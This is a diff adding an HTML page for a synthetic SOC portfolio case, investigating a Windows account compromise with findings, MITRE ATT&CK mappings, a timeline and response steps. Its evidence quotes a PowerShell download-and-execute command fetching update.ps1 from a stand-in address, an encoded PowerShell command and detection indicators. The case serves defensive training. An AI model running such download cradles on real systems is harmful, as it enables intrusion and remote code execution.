@@ -1,0 +1,165 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>SOC Investigation | SOC-LAB-2026-001</title>
+  <style>
+    :root { color-scheme: dark; --bg:#07111f; --panel:#0d1b2d; --line:#20344d; --text:#e7eef7; --muted:#92a5bd; --cyan:#38d9ff; --red:#ff5c7c; --orange:#ffab5c; --green:#58e6a9; }
+    * { box-sizing:border-box; }
+    body { margin:0; font-family:Inter,Segoe UI,Arial,sans-serif; background:radial-gradient(circle at 80% 0,#13294a 0,transparent 36%),var(--bg); color:var(--text); }
+    .shell { max-width:1180px; margin:auto; padding:42px 24px 70px; }
+    .eyebrow { color:var(--cyan); letter-spacing:.16em; text-transform:uppercase; font-size:.76rem; font-weight:800; }
+    h1 { font-size:clamp(2rem,5vw,4.3rem); line-height:1; margin:.45rem 0 1rem; max-width:850px; }
+    .lead { color:var(--muted); font-size:1.08rem; max-width:760px; line-height:1.6; }
+    .metrics { display:grid; grid-template-columns:repeat(4,1fr); gap:14px; margin:32px 0; }
+    .metric,.panel,.finding { border:1px solid var(--line); background:linear-gradient(145deg,rgba(18,37,61,.96),rgba(8,21,37,.96)); border-radius:16px; box-shadow:0 18px 40px rgba(0,0,0,.2); }
+    .metric { padding:20px; } .metric span { color:var(--muted); font-size:.8rem; text-transform:uppercase; letter-spacing:.09em; } .metric strong { display:block; font-size:1.75rem; margin-top:7px; }
+    .score strong { color:var(--red); }
+    .panel { padding:24px; margin-top:18px; overflow:auto; }
+    .panel h2 { margin-top:0; }
+    .controls { display:flex; gap:8px; flex-wrap:wrap; margin:16px 0; }
+    button { background:#122741; border:1px solid var(--line); color:var(--text); border-radius:999px; padding:9px 14px; cursor:pointer; } button.active { background:var(--cyan); color:#03111d; border-color:var(--cyan); font-weight:800; }
+    .findings { display:grid; grid-template-columns:repeat(2,minmax(0,1fr)); gap:16px; }
+    .finding { padding:21px; } .finding h3 { margin:.8rem 0 .5rem; } .finding p,li { color:var(--muted); line-height:1.55; }
+    .finding-head { display:flex; justify-content:space-between; gap:12px; align-items:center; }
+    .badge { text-transform:uppercase; font-size:.72rem; font-weight:900; letter-spacing:.1em; padding:5px 9px; border-radius:999px; } .critical { background:rgba(255,92,124,.15); color:var(--red); } .high { background:rgba(255,171,92,.14); color:var(--orange); }
+    code { color:var(--cyan); } summary { color:var(--cyan); cursor:pointer; font-weight:700; }
+    table { width:100%; border-collapse:collapse; min-width:850px; } th,td { text-align:left; padding:12px; border-bottom:1px solid var(--line); } th { color:var(--cyan); font-size:.75rem; text-transform:uppercase; letter-spacing:.08em; } td { color:var(--muted); font-size:.9rem; }
+    .techniques { display:flex; flex-wrap:wrap; gap:9px; } .technique { border:1px solid var(--line); color:var(--muted); padding:8px 11px; border-radius:8px; }
+    .chain { display:flex; align-items:center; gap:8px; overflow:auto; padding:10px 0; } .chain span { white-space:nowrap; padding:10px 12px; border:1px solid var(--line); border-radius:9px; color:var(--muted); } .chain b { color:var(--cyan); }
+    footer { color:var(--muted); margin-top:30px; font-size:.82rem; }
+    @media(max-width:760px) { .metrics,.findings { grid-template-columns:1fr; } .shell { padding:28px 15px 50px; } }
+  </style>
+</head>
+<body>
+  <main class="shell">
+    <div class="eyebrow">Security Operations Portfolio</div>
+    <h1>Windows Account Compromise Investigation</h1>
+    <p class="lead">A complete analyst view of correlated authentication, execution, network, and sensitive-data telemetry. All evidence in this demonstration is synthetic and safe.</p>
+    <section class="metrics">
+      <div class="metric score"><span>Risk score</span><strong>100/100</strong></div>
+      <div class="metric"><span>Classification</span><strong>true positive</strong></div>
+      <div class="metric"><span>Events</span><strong>14</strong></div>
+      <div class="metric"><span>Findings</span><strong>5</strong></div>
+    </section>
+    <section class="panel">
+      <h2>Attack chain</h2>
+      <div class="chain"><span>Failed logons</span><b>›</b><span>Valid account</span><b>›</b><span>PowerShell</span><b>›</b><span>External connection</span><b>›</b><span>File access</span><b>›</b><span>Archive staging</span></div>
+    </section>
+    <section class="panel">
+      <h2>Correlated findings</h2>
+      <div class="controls"><button class="active" data-filter="all">All</button><button data-filter="critical">Critical</button><button data-filter="high">High</button></div>
+      <div class="findings">
+        <article class="finding" data-severity="critical">
+          <div class="finding-head">
+            <span class="badge critical">critical</span>
+            <code>SOC-AUTH-001</code>
+          </div>
+          <h3>Brute force followed by successful authentication</h3>
+          <p>6 failed logons for j.smith from 203.0.113.77 were followed by a successful logon.</p>
+          <details>
+            <summary>Evidence and response</summary>
+            <h4>Evidence</h4>
+            <ul><li>Event 4625 count: 6</li><li>Successful Event 4624 at 2026-07-15T09:04:02+00:00</li><li>Source: 203.0.113.77; host: WS-FIN-07; user: j.smith</li></ul>
+            <h4>MITRE ATT&amp;CK</h4>
+            <ul><li>T1110 - Brute Force</li><li>T1078 - Valid Accounts</li></ul>
+            <h4>Recommended actions</h4>
+            <ul><li>Disable or contain the affected account.</li><li>Revoke active sessions and reset credentials.</li><li>Block the source and investigate adjacent authentication activity.</li></ul>
+          </details>
+        </article>
+        
+        <article class="finding" data-severity="high">
+          <div class="finding-head">
+            <span class="badge high">high</span>
+            <code>SOC-EXEC-001</code>
+          </div>
+          <h3>Suspicious PowerShell execution</h3>
+          <p>PowerShell used encoded or download-oriented execution patterns.</p>
+          <details>
+            <summary>Evidence and response</summary>
+            <h4>Evidence</h4>
+            <ul><li>Events 1, 4104 on WS-FIN-07</li><li>Matched indicators: -encodedcommand, downloadstring, iex(</li><li>Command line: powershell.exe -NoProfile -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAAp</li><li>Command line: IEX((New-Object Net.WebClient).DownloadString(&#x27;https://198.51.100.25/update.ps1&#x27;))</li></ul>
+            <h4>MITRE ATT&amp;CK</h4>
+            <ul><li>T1059.001 - PowerShell</li><li>T1105 - Ingress Tool Transfer</li></ul>
+            <h4>Recommended actions</h4>
+            <ul><li>Isolate the endpoint and preserve process telemetry.</li><li>Collect the PowerShell script-block and parent-process evidence.</li><li>Hunt for the command indicators across the environment.</li></ul>
+          </details>
+        </article>
+        
+        <article class="finding" data-severity="high">
+          <div class="finding-head">
+            <span class="badge high">high</span>
+            <code>SOC-NET-001</code>
+          </div>
+          <h3>PowerShell established an external network connection</h3>
+          <p>PowerShell connected to an external address after suspicious execution.</p>
+          <details>
+            <summary>Evidence and response</summary>
+            <h4>Evidence</h4>
+            <ul><li>Sysmon Event 3 on WS-FIN-07</li><li>Destination: 198.51.100.25:443</li><li>Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</li></ul>
+            <h4>MITRE ATT&amp;CK</h4>
+            <ul><li>T1071.001 - Web Protocols</li></ul>
+            <h4>Recommended actions</h4>
+            <ul><li>Block and enrich the destination indicator.</li><li>Review proxy, DNS, and firewall telemetry for related activity.</li></ul>
+          </details>
+        </article>
+        
+        <article class="finding" data-severity="high">
+          <div class="finding-head">
+            <span class="badge high">high</span>
+            <code>SOC-DATA-001</code>
+          </div>
+          <h3>Sensitive file accessed after suspected compromise</h3>
+          <p>The affected identity accessed a sensitive file during the incident window.</p>
+          <details>
+            <summary>Evidence and response</summary>
+            <h4>Evidence</h4>
+            <ul><li>Event 4663 on WS-FIN-07</li><li>User: j.smith</li><li>Target: C:\Finance\Confidential\client_list_Q3.xlsx; action: ReadData</li></ul>
+            <h4>MITRE ATT&amp;CK</h4>
+            <ul><li>T1005 - Data from Local System</li></ul>
+            <h4>Recommended actions</h4>
+            <ul><li>Determine whether the file was staged, copied, or exfiltrated.</li><li>Notify the data owner and preserve file-access evidence.</li></ul>
+          </details>
+        </article>
+        
+        <article class="finding" data-severity="high">
+          <div class="finding-head">
+            <span class="badge high">high</span>
+            <code>SOC-DATA-002</code>
+          </div>
+          <h3>Sensitive data staged in an archive</h3>
+          <p>A process created an archive whose name matches sensitive business data.</p>
+          <details>
+            <summary>Evidence and response</summary>
+            <h4>Evidence</h4>
+            <ul><li>Sysmon Event 11 on WS-FIN-07</li><li>Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</li><li>Archive: C:\Users\j.smith\AppData\Local\Temp\client_list_Q3.zip</li></ul>
+            <h4>MITRE ATT&amp;CK</h4>
+            <ul><li>T1560.001 - Archive via Utility</li></ul>
+            <h4>Recommended actions</h4>
+            <ul><li>Preserve and hash the archive before containment cleanup.</li><li>Determine whether the archive was transmitted or copied elsewhere.</li><li>Hunt for similarly named archives across endpoints and shared storage.</li></ul>
+          </details>
+        </article>
+        </div>
+    </section>
+    <section class="panel">
+      <h2>Event timeline</h2>
+      <table><thead><tr><th>UTC timestamp</th><th>Event</th><th>Host</th><th>User</th><th>Analyst summary</th></tr></thead><tbody><tr><td>2026-07-15T09:00:11Z</td><td>4625</td><td>WS-FIN-07</td><td>j.smith</td><td>Authentication failure from 203.0.113.77</td></tr><tr><td>2026-07-15T09:00:48Z</td><td>4625</td><td>WS-FIN-07</td><td>j.smith</td><td>Authentication failure from 203.0.113.77</td></tr><tr><td>2026-07-15T09:01:22Z</td><td>4625</td><td>WS-FIN-07</td><td>j.smith</td><td>Authentication failure from 203.0.113.77</td></tr><tr><td>2026-07-15T09:02:05Z</td><td>4625</td><td>WS-FIN-07</td><td>j.smith</td><td>Authentication failure from 203.0.113.77</td></tr><tr><td>2026-07-15T09:02:44Z</td><td>4625</td><td>WS-FIN-07</td><td>j.smith</td><td>Authentication failure from 203.0.113.77</td></tr><tr><td>2026-07-15T09:03:18Z</td><td>4625</td><td>WS-FIN-07</td><td>j.smith</td><td>Authentication failure from 203.0.113.77</td></tr><tr><td>2026-07-15T09:04:02Z</td><td>4624</td><td>WS-FIN-07</td><td>j.smith</td><td>Authentication success from 203.0.113.77</td></tr><tr><td>2026-07-15T09:04:51Z</td><td>1</td><td>WS-FIN-07</td><td>j.smith</td><td>Process or script activity: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</td></tr><tr><td>2026-07-15T09:05:07Z</td><td>4104</td><td>WS-FIN-07</td><td>j.smith</td><td>Process or script activity: powershell.exe</td></tr><tr><td>2026-07-15T09:05:19Z</td><td>3</td><td>WS-FIN-07</td><td>j.smith</td><td>Network connection to 198.51.100.25:443</td></tr><tr><td>2026-07-15T09:06:42Z</td><td>4663</td><td>WS-FIN-07</td><td>j.smith</td><td>File activity: C:\Finance\Confidential\client_list_Q3.xlsx</td></tr><tr><td>2026-07-15T09:07:10Z</td><td>11</td><td>WS-FIN-07</td><td>j.smith</td><td>File activity: C:\Users\j.smith\AppData\Local\Temp\client_list_Q3.zip</td></tr><tr><td>2026-07-15T09:08:03Z</td><td>4688</td><td>WS-FIN-07</td><td>j.smith</td><td>Security telemetry event</td></tr><tr><td>2026-07-15T09:09:15Z</td><td>4624</td><td>WS-HR-02</td><td>m.jones</td><td>Authentication success from 10.20.30.58</td></tr></tbody></table>
+    </section>
+    <section class="panel"><h2>MITRE ATT&amp;CK coverage</h2><div class="techniques"><span class='technique'>T1005 - Data from Local System</span><span class='technique'>T1059.001 - PowerShell</span><span class='technique'>T1071.001 - Web Protocols</span><span class='technique'>T1078 - Valid Accounts</span><span class='technique'>T1105 - Ingress Tool Transfer</span><span class='technique'>T1110 - Brute Force</span><span class='technique'>T1560.001 - Archive via Utility</span></div></section>
+    <footer>Case SOC-LAB-2026-001 | Synthetic portfolio evidence | Generated by the local SOC analyzer</footer>
+  </main>
+  <script id="case-data" type="application/json">{"case_id": "SOC-LAB-2026-001", "classification": "true_positive", "confidence": "high", "attack_chain_complete": true, "event_count": 14, "finding_count": 5, "risk_score": 100, "severity_counts": {"critical": 1, "high": 4}, "hosts": ["WS-FIN-07", "WS-HR-02"], "users": ["j.smith", "m.jones"], "incident_window": {"first_event": "2026-07-15T09:00:11Z", "last_event": "2026-07-15T09:09:15Z", "duration_seconds": 544}, "mitre_attack": ["T1005 - Data from Local System", "T1059.001 - PowerShell", "T1071.001 - Web Protocols", "T1078 - Valid Accounts", "T1105 - Ingress Tool Transfer", "T1110 - Brute Force", "T1560.001 - Archive via Utility"], "event_timeline": [{"timestamp": "2026-07-15T09:00:11Z", "event_id": "4625", "host": "WS-FIN-07", "channel": "Security", "username": "j.smith", "summary": "Authentication failure from 203.0.113.77"}, {"timestamp": "2026-07-15T09:00:48Z", "event_id": "4625", "host": "WS-FIN-07", "channel": "Security", "username": "j.smith", "summary": "Authentication failure from 203.0.113.77"}, {"timestamp": "2026-07-15T09:01:22Z", "event_id": "4625", "host": "WS-FIN-07", "channel": "Security", "username": "j.smith", "summary": "Authentication failure from 203.0.113.77"}, {"timestamp": "2026-07-15T09:02:05Z", "event_id": "4625", "host": "WS-FIN-07", "channel": "Security", "username": "j.smith", "summary": "Authentication failure from 203.0.113.77"}, {"timestamp": "2026-07-15T09:02:44Z", "event_id": "4625", "host": "WS-FIN-07", "channel": "Security", "username": "j.smith", "summary": "Authentication failure from 203.0.113.77"}, {"timestamp": "2026-07-15T09:03:18Z", "event_id": "4625", "host": "WS-FIN-07", "channel": "Security", "username": "j.smith", "summary": "Authentication failure from 203.0.113.77"}, {"timestamp": "2026-07-15T09:04:02Z", "event_id": "4624", "host": "WS-FIN-07", "channel": "Security", "username": "j.smith", "summary": "Authentication success from 203.0.113.77"}, {"timestamp": "2026-07-15T09:04:51Z", "event_id": "1", "host": "WS-FIN-07", "channel": "Microsoft-Windows-Sysmon/Operational", "username": "j.smith", "summary": "Process or script activity: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, {"timestamp": "2026-07-15T09:05:07Z", "event_id": "4104", "host": "WS-FIN-07", "channel": "Microsoft-Windows-PowerShell/Operational", "username": "j.smith", "summary": "Process or script activity: powershell.exe"}, {"timestamp": "2026-07-15T09:05:19Z", "event_id": "3", "host": "WS-FIN-07", "channel": "Microsoft-Windows-Sysmon/Operational", "username": "j.smith", "summary": "Network connection to 198.51.100.25:443"}, {"timestamp": "2026-07-15T09:06:42Z", "event_id": "4663", "host": "WS-FIN-07", "channel": "Security", "username": "j.smith", "summary": "File activity: C:\\Finance\\Confidential\\client_list_Q3.xlsx"}, {"timestamp": "2026-07-15T09:07:10Z", "event_id": "11", "host": "WS-FIN-07", "channel": "Microsoft-Windows-Sysmon/Operational", "username": "j.smith", "summary": "File activity: C:\\Users\\j.smith\\AppData\\Local\\Temp\\client_list_Q3.zip"}, {"timestamp": "2026-07-15T09:08:03Z", "event_id": "4688", "host": "WS-FIN-07", "channel": "Security", "username": "j.smith", "summary": "Security telemetry event"}, {"timestamp": "2026-07-15T09:09:15Z", "event_id": "4624", "host": "WS-HR-02", "channel": "Security", "username": "m.jones", "summary": "Authentication success from 10.20.30.58"}], "findings": [{"rule_id": "SOC-AUTH-001", "title": "Brute force followed by successful authentication", "severity": "critical", "description": "6 failed logons for j.smith from 203.0.113.77 were followed by a successful logon.", "first_seen": "2026-07-15T09:00:11Z", "last_seen": "2026-07-15T09:04:02Z", "evidence": ["Event 4625 count: 6", "Successful Event 4624 at 2026-07-15T09:04:02+00:00", "Source: 203.0.113.77; host: WS-FIN-07; user: j.smith"], "mitre_attack": ["T1110 - Brute Force", "T1078 - Valid Accounts"], "recommended_actions": ["Disable or contain the affected account.", "Revoke active sessions and reset credentials.", "Block the source and investigate adjacent authentication activity."]}, {"rule_id": "SOC-EXEC-001", "title": "Suspicious PowerShell execution", "severity": "high", "description": "PowerShell used encoded or download-oriented execution patterns.", "first_seen": "2026-07-15T09:04:51Z", "last_seen": "2026-07-15T09:05:07Z", "evidence": ["Events 1, 4104 on WS-FIN-07", "Matched indicators: -encodedcommand, downloadstring, iex(", "Command line: powershell.exe -NoProfile -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAAp", "Command line: IEX((New-Object Net.WebClient).DownloadString('https://198.51.100.25/update.ps1'))"], "mitre_attack": ["T1059.001 - PowerShell", "T1105 - Ingress Tool Transfer"], "recommended_actions": ["Isolate the endpoint and preserve process telemetry.", "Collect the PowerShell script-block and parent-process evidence.", "Hunt for the command indicators across the environment."]}, {"rule_id": "SOC-NET-001", "title": "PowerShell established an external network connection", "severity": "high", "description": "PowerShell connected to an external address after suspicious execution.", "first_seen": "2026-07-15T09:05:19Z", "last_seen": "2026-07-15T09:05:19Z", "evidence": ["Sysmon Event 3 on WS-FIN-07", "Destination: 198.51.100.25:443", "Process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"], "mitre_attack": ["T1071.001 - Web Protocols"], "recommended_actions": ["Block and enrich the destination indicator.", "Review proxy, DNS, and firewall telemetry for related activity."]}, {"rule_id": "SOC-DATA-001", "title": "Sensitive file accessed after suspected compromise", "severity": "high", "description": "The affected identity accessed a sensitive file during the incident window.", "first_seen": "2026-07-15T09:06:42Z", "last_seen": "2026-07-15T09:06:42Z", "evidence": ["Event 4663 on WS-FIN-07", "User: j.smith", "Target: C:\\Finance\\Confidential\\client_list_Q3.xlsx; action: ReadData"], "mitre_attack": ["T1005 - Data from Local System"], "recommended_actions": ["Determine whether the file was staged, copied, or exfiltrated.", "Notify the data owner and preserve file-access evidence."]}, {"rule_id": "SOC-DATA-002", "title": "Sensitive data staged in an archive", "severity": "high", "description": "A process created an archive whose name matches sensitive business data.", "first_seen": "2026-07-15T09:07:10Z", "last_seen": "2026-07-15T09:07:10Z", "evidence": ["Sysmon Event 11 on WS-FIN-07", "Process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "Archive: C:\\Users\\j.smith\\AppData\\Local\\Temp\\client_list_Q3.zip"], "mitre_attack": ["T1560.001 - Archive via Utility"], "recommended_actions": ["Preserve and hash the archive before containment cleanup.", "Determine whether the archive was transmitted or copied elsewhere.", "Hunt for similarly named archives across endpoints and shared storage."]}]}</script>
+  <script>
+    const report = JSON.parse(document.getElementById('case-data').textContent);
+    document.querySelectorAll('button[data-filter]').forEach(button => button.addEventListener('click', () => {
+      document.querySelectorAll('button[data-filter]').forEach(item => item.classList.remove('active'));
+      button.classList.add('active');
+      document.querySelectorAll('.finding').forEach(card => {
+        card.hidden = button.dataset.filter !== 'all' && card.dataset.severity !== button.dataset.filter;
+      });
+    }));
+    window.socCase = report;
+  </script>
+</body>
+</html>
